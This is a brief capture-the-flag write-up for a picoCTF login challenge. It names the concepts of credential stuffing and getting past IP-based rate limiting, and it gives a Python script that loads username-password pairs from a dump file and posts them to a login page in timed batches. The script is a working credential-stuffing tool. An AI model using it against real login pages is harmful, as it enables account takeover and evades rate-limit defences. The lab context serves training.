# URL
https://learn.cylabacademy.org/library/743
# Concept
* source code analysis
* credential stuffing
* IP-based rate-limiting bypass
# Method of solve
```Python
import requests
import time
import sys

host = "http://candy-mountain.picoctf.net:62168/" # fill this in

# Variables that handle the request batches
batch_size = 9
sleep_time = 32
batch_count = 0
i = 0

credentials = []

# Populate the credentials list
with open('creds-dump.txt') as f:
    for line in f:
        user, pw = line.strip().split(';', 1)
        credentials.append((user, pw))

print(f'[*] Loaded {len(credentials)} credential pairs')

while i < len(credentials):
    user, pw = credentials[i]
    if batch_count == batch_size:
        print(f'\n[*] Waiting {sleep_time}s for reset...\n')
        time.sleep(sleep_time)
        batch_count = 0
    batch_count += 1
    print(f'[TRYING] {user}:{pw}')
    with requests.Session() as s:
        r = s.post(
            f'{host}/login',
            data={'username': user, 'password': pw},
        )
        if "Invalid" not in r.text:
            print(f'\n[SUCCESS] {user}:{pw}')
            print(f'[RESPONSE] {r.text}')
            sys.exit(0)
    i += 1
```



